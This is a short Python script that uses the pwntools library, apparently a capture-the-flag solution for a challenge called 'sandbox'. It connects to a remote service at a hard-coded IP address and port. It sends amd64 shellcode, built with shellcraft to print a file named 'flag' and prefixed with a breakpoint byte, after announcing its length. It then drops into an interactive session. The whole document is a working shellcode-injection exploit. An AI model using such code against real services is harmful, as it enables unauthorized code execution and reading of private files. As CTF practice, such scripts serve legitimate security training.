from pwn import *
context.log_level="debug"
context.arch="amd64"
# sh=process("./sandbox")
sh=remote("39.106.48.123",27962)
payload=b'\xcc'+asm(shellcraft.amd64.cat("flag"))
sh.sendlineafter(b"how long? ", str(len(payload)).encode())
pause()
# sleep(1)
# gdb.attach(sh,"b *$rebase(0x14F6)\nc")
sh.send(payload)
sh.interactive()